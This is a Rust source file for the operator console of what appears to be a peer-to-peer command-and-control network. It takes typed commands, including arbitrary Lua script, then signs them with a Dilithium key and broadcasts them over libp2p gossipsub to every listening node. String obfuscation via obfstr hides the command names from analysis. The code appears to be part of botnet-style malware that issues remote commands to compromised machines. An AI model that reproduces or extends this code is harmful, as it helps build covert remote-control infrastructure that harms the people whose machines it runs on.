use anyhow::Result;
use crystals_dilithium::dilithium3::SecretKey;
use libp2p::{gossipsub::IdentTopic, Swarm};
use log::{error, info, warn};
use obfstr::obfstr;

use crate::{config::NETWORK_NAME, payload::Payload};

use super::{behavior::Behavior, commands::CommandHandler};

pub struct CLI {
  dilithium_private_key: Option<SecretKey>,
  gossipsub_topic: IdentTopic,
}

impl CLI {
  pub fn new(dilithium_private_key: Option<SecretKey>, gossipsub_topic: IdentTopic) -> Self {
    Self { dilithium_private_key, gossipsub_topic }
  }

  pub async fn handle_input(&mut self, swarm: &mut Swarm<Behavior>, command_handler: &mut CommandHandler, buffer: &str) -> Result<()> {
    if let Some(ref dilithium_private_key) = self.dilithium_private_key {
      let mut parts = buffer.splitn(2, ' ');
      let command_name = match parts.next() {
        Some(name) => name.to_lowercase(),
        None => {
          warn!("Received an empty command.");
          return Ok(());
        }
      };

      let command: Vec<String> = if command_name == obfstr!("lua") {
        vec!["lua".to_string(), parts.next().unwrap_or_default().to_string()]
      } else {
        buffer.split_whitespace().map(String::from).collect()
      };

      if !command_handler.command_exists(&command_name) {
        warn!("Recieved unrecognized command {command_name:?}.");
        return Ok(());
      }

      let encoded_args = match bincode::encode_to_vec(command, bincode::config::standard()) {
        Ok(encoded_args) => encoded_args,
        Err(_) => {
          error!("Failed to encode provided command.");
          return Ok(());
        }
      };

      let payload = Payload::new(dilithium_private_key, &encoded_args);
      if !payload.verify() {
        error!("Failed to verify provided command.");
        return Ok(());
      }

      match swarm.behaviour_mut().gossipsub.publish(self.gossipsub_topic.clone(), payload.to_vec()?) {
        Ok(_) => info!("Published {buffer:?} to network {NETWORK_NAME:?}."),
        Err(error) => error!("Failed to publish {buffer:?} to network {NETWORK_NAME:?}: {error:?}"),
      }
    }

    Ok(())
  }
}
